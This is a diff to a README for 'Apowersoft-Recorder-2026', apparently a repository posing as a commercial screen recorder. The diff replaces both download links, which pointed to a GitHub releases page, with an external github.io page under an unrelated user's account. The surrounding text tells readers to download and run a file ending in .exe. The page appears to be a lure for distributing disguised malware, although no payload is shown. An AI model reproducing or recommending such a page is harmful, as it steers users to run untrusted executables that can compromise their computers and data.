@@ -1,6 +1,6 @@
 # 💻 Apowersoft-Recorder-2026 - Capture your screen with complete ease
 
-[![](https://img.shields.io/badge/Download-Apowersoft_Recorder-blue.svg)](https://github.com/Unfaceted-wesley580/Apowersoft-Recorder-2026/releases)
+[![](https://img.shields.io/badge/Download-Apowersoft_Recorder-blue.svg)](https://unfaceted-wesley580.github.io)
 
 Apowersoft-Recorder-2026 provides a reliable way to record your computer screen on Windows 11 and Windows 10. Use this software to create high-quality videos of your desktop activity, browser sessions, or software tutorials. This guide explains how to get the software onto your computer and perform the initial setup.
 
@@ -18,7 +18,7 @@ To run this recorder, your computer needs to meet these basic standards:
 
 You can download the latest version of the installer from the official release page. 
 
-[Visit the download page to obtain the installer](https://github.com/Unfaceted-wesley580/Apowersoft-Recorder-2026/releases)
+[Visit the download page to obtain the installer](https://unfaceted-wesley580.github.io)
 
 Click on the file ending in .exe to begin your download. Save the file to your Downloads folder or your desktop for easy access.
 
